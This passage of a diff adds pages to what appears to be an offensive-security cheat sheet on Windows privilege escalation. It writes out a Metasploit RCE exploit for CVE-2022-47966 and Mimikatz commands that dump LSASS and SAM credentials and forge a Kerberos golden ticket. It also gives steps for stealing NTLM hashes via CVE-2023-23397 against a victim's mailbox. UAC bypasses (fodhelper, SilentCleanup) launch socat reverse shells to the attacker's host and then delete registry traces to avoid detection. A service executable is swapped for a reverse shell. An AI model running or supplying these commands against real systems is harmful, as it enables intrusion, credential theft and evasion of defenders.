+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>msf&gt; use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>msf&gt; set GUID 43ae36f51da65753530a64b37a510a53
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>msf&gt; set ISSUER_URL http://example.com/adfs/services/trust
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>msf&gt; set RHOSTS &lt;target-ip&gt;
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>msf&gt; set RPORT 9251
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>msf&gt; set LHOST &lt;local-ip&gt;
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>msf&gt; set LPORT 4444
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>msf&gt; run
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>meterpreter&gt; shell
+</span></code></pre></div>
+<h1 id="mimikatz">Mimikatz</h1>
+<p>Mimikatz is a password dumping tool for Windows. It also manages Kerberos tickets. Kiwi is the updated version of Mimikatz.</p>
+<p>You can download it from the <a href="https://github.com/gentilkiwi/mimikatz">GitHub repository</a>.</p>
+<h2 id="usage">Usage</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>mimikatz
+</span></code></pre></div>
+<ul>
+<li><strong>Check if Mimikatz Running as an Administrator</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>    mimikatz # privilege::debug
+</span></code></pre></div>
+<ul>
+<li><strong>Elevate to SYSTEM Level</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>    mimikatz # token::elevate
+</span></code></pre></div>
+<ul>
+<li><strong>Dump Hashes</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>    mimikatz # lsadump::lsa /patch
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code>- **Security Identifier of the Kerberos Ticket Granting Ticket Account**
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>        mimikatz # lsadump::lsa /inject /name:krbtgt
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code>- **All SAM Local Password Hashes**
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>        mimikatz # lsadump::sam
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code>- **Credentials from the LSASS Memory**
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>        mimikatz # sekurlsa::logonpasswords
+</span></code></pre></div>
+<ul>
+<li><strong>Create a Kerberos Golden Ticket</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>    mimikatz # kerberos::golden /user:Administrator /domain:sample.domain /sid
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>    :S-1-5-21-849420856-2351964222-986696166 /krbtgt:7808900312cc005cf7082a9a89eb
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>    dfdf /id:500
+</span></code></pre></div>
+<ol>
+<li><strong>Open a New Command Prompt</strong></li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>    mimikatz # misc::cmd
+</span></code></pre></div>
+<h1 id="outlook-reminder-privilege-escalation">Outlook Reminder Privilege Escalation</h1>
+<p>The Outlook’s Reminder method is vulnerable to privilege escalation by abusing the UNC (Universal Naming Convention) file path of the reminder sound. CVE-2023-23397.</p>
+<div class="language-text highlight"><pre><span></span><code>- [outlookntlmleak](https://tryhackme.com/room/outlookntlmleak)
+</code></pre></div>
+<h2 id="exploitation_1">Exploitation</h2>
+<p>To carry out this attack, the OutlookSpy is required. So please install it before proceeding.</p>
+<ol>
+<li>Start Responder</li>
+</ol>
+<p>First off, start responder in our local machine to capture NetNTLM authentication.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a># -I: Interface (eth0, tun0, etc.)
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>responder -I tun0
+</span></code></pre></div>
+<ol>
+<li>
+<p>Modify Reminder Settings using OutlookSpy</p>
+</li>
+<li>
+<p>In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.</p>
+</li>
+<li>In new Appointment window, select OutlookSpy tab then click CurrentItem. The AppointmentItem window will open.</li>
+<li>In AppointmentItem window, click Script tab and input the following value.<div class="language-text highlight"><pre><span></span><code>  Replace “10.0.0.1” with your local server ip.
+</code></pre></div>
+</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>    AppointmentItem.ReminderOverrideDefault = true
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>    AppointmentItem.ReminderPlaySound = true
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>    AppointmentItem.ReminderSoundFile =&quot;\\10.0.0.1\test.wav&quot;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code>After that, click Run button to apply the new properties.
+
+To confirm if the properties applied, click Properties tab and choose the following items in left pane.
+
+- ReminderOverrideDefault
+- ReminderPlaySound
+- ReminderSoundFile
+
+Close the AppointmentItem window.
+</code></pre></div>
+<ol>
+<li>
+<p>Attach New Appointment</p>
+</li>
+<li>
+<p>Click Appointment tab and click Reminder in the Options section. Then set 0 minutes.</p>
+</li>
+<li>Fill the Subject, Location and Message with arbitrary values.</li>
+<li>
+<p>To send the appointment to the victim address, click Forward in Actions section in Appointment tab. Then enter the victim email address as a destination. Now click Send button.</p>
+</li>
+<li>
+<p>Capture the Victim’s NTLMv2 Hash with Responder</p>
+</li>
+<li>
+<p>Because we set the reminder with 0 minutes, we should see the reminder popup immediately after saving.</p>
+</li>
+<li>In our terminal, responder, that we’ve launched, captured the NTLMv2 hash.</li>
+</ol>
+<h1 id="switch-user-on-windows">Switch User on Windows</h1>
+<h2 id="runas">Runas</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>runas /user:&lt;username&gt; cmd
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>runas /user:&lt;domain&gt;\&lt;username&gt; cmd
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="runascs">RunasCS</h2>
+<p>We can spawn another shell as another user with <a href="https://github.com/antonioCoco/RunasCs">RunasCS</a>.<br />
+First, start a listener on local machine.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<p>Then execute the following command on target machine.<br />
+Replace <code>10.0.0.1:4444</code> with your local IP and port.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>RunasCs.exe &lt;username&gt; &lt;password&gt; cmd -r 10.0.0.1:4444
+</span></code></pre></div>
+<h1 id="uac-windows-privilege-escalation">UAC Windows Privilege Escalation</h1>
+<p>UAC (User Account Control) is an access control enforcement feature.</p>
+<div class="language-text highlight"><pre><span></span><code>- [CVE-2019-1388](https://github.com/nobodyatall648/CVE-2019-1388)
+</code></pre></div>
+<h2 id="automation">Automation</h2>
+<p><strong><a href="https://github.com/hfiref0x/UACME">UACME</a></strong> is an automation tool for defeating Windows UAC.</p>
+<p><br /></p>
+<h2 id="investigation_1">Investigation</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a># Check the current user&#39;s integrity level
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>whoami /groups | findstr &quot;Label&quot;
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>whoami /groups | find &quot;Label&quot;
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="uac-bypass">UAC Bypass</h2>
+<h3 id="azmanmsc-authorization-manager">AZMAN.MSC (Authorization Manager)</h3>
+<ol>
+<li>Open AZMAN.MSC by entering “azman.msc” in the Run.</li>
+<li>Click Help and select Help Topics. The MMC window will open.</li>
+<li>In the MMC window, right-click and select View Source. The Notepad opens.</li>
+<li>In the Notepad, select File → Open. </li>
+<li>then click Open. Command Prompt will open.</li>
+<li>In Command Prompt, we should escalate to High integrity level. For instance, try <code>cd C:\Users\Administrator</code> command. We may be able to access this directory even if we’re not Administrator.</li>
+<li>In Explorer, select Windows/System32/cmd.exe and right-click, then select Open.</li>
+<li>We should escalate to High integrity level.</li>
+</ol>
+<h3 id="fodhelper-features-on-demand-helper">Fodhelper (Features on Demand Helper)</h3>
+<p>Fodhelper manages the Windows features settings.</p>
+<p>First start listener in local machine for getting incoming connection.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<p>In remote Windows machien, add subkey to the registry and execute fodhelper to reverse shell.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>set CMD=&quot;powershell -windowstyle hidden C:\socat.exe TCP:&lt;local-ip&gt;:4444 EXEC:cmd.exe,pipes&quot;
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a># /v: Value name under the selected key.
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a># /d: Data to assign to the registry ValueName being added.
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a># /f: Force overwriting the existing registry entry without prompt.
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>reg add %REG_KEY% /v &quot;DelegateExecute&quot; /d &quot;&quot; /f
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>reg add %REG_KEY% /d %CMD% /f &amp; fodhelper.exe
+</span></code></pre></div>
+<p>We should get a shell and elevate High integrity level.</p>
+<p>To check the IL, run the following command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>whoami /groups | find &quot;Label&quot;
+</span></code></pre></div>
+<p>Finally, we need to clear the above settings to avoid detection.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a># /f: Forces the deletion without prompt
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>reg delete HKCU\Software\Classes\ms-settings\ /f
+</span></code></pre></div>
+<h3 id="scheduled-task-disk-cleanup">Scheduled Task: Disk Cleanup</h3>
+<p>Start listener for getting reverse connection in local machine.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<p>Add the entry to registry to reverse shell.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>reg add &quot;HKCU\Environment&quot; /v &quot;windir&quot; /d &quot;cmd.exe /c C:\socat.exe TCP:&lt;local-ip&gt;:4444 EXEC:cmd.exe,pipes &amp;REM &quot; /f
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a># /run: Start the scheduled tasks immediately.
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a># /tn: Task name
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a># /I: Idle time
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+</span></code></pre></div>
+<h3 id="system-configuration-msconfig">System Configuration (msconfig)</h3>
+<ol>
+<li>Open System Configuration by entering <strong>"msconfig"</strong> in the Run.</li>
+<li>Go to Tools tab and select Command Prompt, then click Launch.</li>
+<li>We should escalate to High integrity level.</li>
+</ol>
+<p><br /></p>
+<h2 id="abuse-uac-windows-certificate-dialog-cve-2019-1388">Abuse UAC Windows Certificate Dialog (CVE-2019-1388)</h2>
+<p>UAC Windows Certificate Dialog is vulnerable to privilege escalation.</p>
+<ol>
+<li>Open <strong>hhupd.exe</strong>. The User Account Control window opens.</li>
+<li>Click the <strong>"Show more details"</strong> and click also <strong>"Show information about the publisher’s certificate"</strong>.  </li>
+<li>Now click the <strong>"Issued by"</strong> link. Web browser will open.</li>
+<li>In web browser, select <strong>Tools -&gt; File -&gt; Save as...</strong>.</li>
+<li>
+<p>On the explorer window address path, enter the cmd.exe full path as below:</p>
+<p><strong>"c:\Windows\System32\cmd.exe"</strong></p>
+</li>
+</ol>
+<p>Now we escalated the privilege.</p>
+<p><br /></p>
+<h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
+<p>Privilege Escalation (PrivEsc) in Windows is a process that get the Administrator credential and login.</p>
+<div class="language-text highlight"><pre><span></span><code>- [windows-local-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+- [powershell-7.3](https://learn.microsoft.com/en-us/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.3)
+</code></pre></div>
+<h2 id="automation_1">Automation</h2>
+<p>We might be able to find vulnerabilities on target Windows machine with automation tools as below:</p>
+<ul>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a></li>
+<li><a href="https://github.com/bitsadmin/wesng">wesng (Windows Exploit Suggester Next Generation)</a></li>
+<li><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a></li>
+</ul>
+<p><br /></p>
+<h2 id="lolbas-living-off-the-land-binaries-scripts-and-libraries">LOLBAS (Living Off the Land Binaries, Scripts and Libraries)</h2>
+<p><a href="https://lolbas-project.github.io/">LOLBAS</a> provides misuses tools and executables already in the Windows system.
+So check the website.</p>
+<p><br /></p>
+<h2 id="os-information">OS Information</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>hostname
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>systeminfo
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>systeminfo | findstr &quot;OS&quot;
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>ver
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>[System.Environment]::OSVersion.Version
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a># Datetime
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>Get-Date
+</span></code></pre></div>
+<h2 id="interesting-information">Interesting Information</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a># Current user
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>whoami
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>whoami /user
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>whoami /groups
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>whoami /priv
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>whoami /all
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>echo %username%
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a># List users
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>net user
+</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>net users
+</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>net user USERNAME
+</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>Get-LocalUser
+</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>
+</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a># List groups
+</span><span id="__span-44-16"><a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a>net group
+</span><span id="__span-44-17"><a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a>net localgroup
+</span><span id="__span-44-18"><a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a># List users in specific group
+</span><span id="__span-44-19"><a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>net localgroup &quot;Remote Management Users&quot;
+</span><span id="__span-44-20"><a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a>
+</span><span id="__span-44-21"><a id="__codelineno-44-21" name="__codelineno-44-21" href="#__codelineno-44-21"></a># List user home directories
+</span><span id="__span-44-22"><a id="__codelineno-44-22" name="__codelineno-44-22" href="#__codelineno-44-22"></a>Get-ChildItem C:\Users -Force
+</span><span id="__span-44-23"><a id="__codelineno-44-23" name="__codelineno-44-23" href="#__codelineno-44-23"></a>
+</span><span id="__span-44-24"><a id="__codelineno-44-24" name="__codelineno-44-24" href="#__codelineno-44-24"></a># Network
+</span><span id="__span-44-25"><a id="__codelineno-44-25" name="__codelineno-44-25" href="#__codelineno-44-25"></a>ipconfig
+</span><span id="__span-44-26"><a id="__codelineno-44-26" name="__codelineno-44-26" href="#__codelineno-44-26"></a>ipconfig /all
+</span><span id="__span-44-27"><a id="__codelineno-44-27" name="__codelineno-44-27" href="#__codelineno-44-27"></a>route print
+</span><span id="__span-44-28"><a id="__codelineno-44-28" name="__codelineno-44-28" href="#__codelineno-44-28"></a>arp -A
+</span><span id="__span-44-29"><a id="__codelineno-44-29" name="__codelineno-44-29" href="#__codelineno-44-29"></a>Get-NetAdapter
+</span><span id="__span-44-30"><a id="__codelineno-44-30" name="__codelineno-44-30" href="#__codelineno-44-30"></a>
+</span><span id="__span-44-31"><a id="__codelineno-44-31" name="__codelineno-44-31" href="#__codelineno-44-31"></a># Firewall
+</span><span id="__span-44-32"><a id="__codelineno-44-32" name="__codelineno-44-32" href="#__codelineno-44-32"></a>netsh firewall show state
+</span><span id="__span-44-33"><a id="__codelineno-44-33" name="__codelineno-44-33" href="#__codelineno-44-33"></a>netsh firewall show config
+</span><span id="__span-44-34"><a id="__codelineno-44-34" name="__codelineno-44-34" href="#__codelineno-44-34"></a>netsh advfirewall show allprofiles
+</span><span id="__span-44-35"><a id="__codelineno-44-35" name="__codelineno-44-35" href="#__codelineno-44-35"></a>
+</span><span id="__span-44-36"><a id="__codelineno-44-36" name="__codelineno-44-36" href="#__codelineno-44-36"></a># PowerShell info
+</span><span id="__span-44-37"><a id="__codelineno-44-37" name="__codelineno-44-37" href="#__codelineno-44-37"></a>Get-Host
+</span><span id="__span-44-38"><a id="__codelineno-44-38" name="__codelineno-44-38" href="#__codelineno-44-38"></a>$Host
+</span><span id="__span-44-39"><a id="__codelineno-44-39" name="__codelineno-44-39" href="#__codelineno-44-39"></a>$PSVersionTable
+</span><span id="__span-44-40"><a id="__codelineno-44-40" name="__codelineno-44-40" href="#__codelineno-44-40"></a># Display only the PowerShell version.
+</span><span id="__span-44-41"><a id="__codelineno-44-41" name="__codelineno-44-41" href="#__codelineno-44-41"></a>(Get-Host).Version
+</span><span id="__span-44-42"><a id="__codelineno-44-42" name="__codelineno-44-42" href="#__codelineno-44-42"></a>$Host.Version
+</span></code></pre></div>
+<h3 id="find-os-vulnerabilities">Find OS Vulnerabilities</h3>
+<p>After investigating the OS information, find the vulnerabilities of OS version.</p>
+<p><br /></p>
+<h2 id="recent-files">Recent Files</h2>
+<ol>
+<li>Right-click on the Windows icon.</li>
+<li>Click <strong>Run</strong>.</li>
+<li>Type <code>recent</code>in the search form.</li>
+</ol>
+<p><br /></p>
+<h2 id="running-services">Running Services</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>wmic service list
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>wmic service list | findstr &quot;Backup&quot;
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a># Get target process info
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>wmic process get processid,parentprocessid,executablepath | find &quot;&lt;process-id&gt;&quot;
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a># Get users SID
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>wmic useraccount get name,sid
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a># Launch the hidden executable hiding within ADS
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a>wmic process call create $(Resolve-Path .\file.exe:streamname)
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a>
+</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a># Processes and services
+</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a>sc query state=all
+</span><span id="__span-45-14"><a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a>tasklist /svc
+</span><span id="__span-45-15"><a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a>Get-Process
+</span><span id="__span-45-16"><a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a>ps
+</span><span id="__span-45-17"><a id="__codelineno-45-17" name="__codelineno-45-17" href="#__codelineno-45-17"></a>
+</span><span id="__span-45-18"><a id="__codelineno-45-18" name="__codelineno-45-18" href="#__codelineno-45-18"></a># Query the configuration info for a specified service
+</span><span id="__span-45-19"><a id="__codelineno-45-19" name="__codelineno-45-19" href="#__codelineno-45-19"></a>sc qc &quot;example-service&quot;
+</span></code></pre></div>
+<h3 id="override-service-executable">Override Service Executable</h3>
+<p>At first, check the service status and get the executable for the service.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a># 1. List running services and find interesting service
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>tasklist
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a># or
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>Get-Process
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a># or
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>ps
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>
+</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a># 2. Check status the service
+</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>sc qc &quot;example-service&quot;
+</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a># In the result, we can see the path of the executable which runs the service.
+</span></code></pre></div>
+<p>Now check if we have write access under the folder where the executable exists.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>echo &quot;test&quot; &gt; \path\to\service-folder\test.txt
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>dir \path\to\service-folder
+</span></code></pre></div>
+<p>If we could write arbitrary file under the service folder, we may be able to replace the executable file as below:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>cp revshell.exe \path\to\service-folder\example-service.exe
+</span></code></pre></div>
+<p>For example, if we want to do reverse shell, we need to prepare a net listener on our local machine:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<p>Now restart the service on target machine:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>sc stop &quot;example-service&quot;
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>sc start &quot;example-service&quot;
+</span></code></pre></div>
+<p>When the service restarts, our 'evil' executable is executed in stead of the original executable.<br />
+After few seconds, we might be able to get the shell on local machine.</p>
+<p><br /></p>
+<h2 id="running-processes">Running Processes</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a># -a: All connections and ports
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a># -f: Display FQDN (Fully Qualified Domain Names)
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a># -o: Display the owning process ID associated with each connection
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>netstat -afo
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a># -n: Display address and port in numerical form (not resolve domain)
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>netstat -ano
+</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>
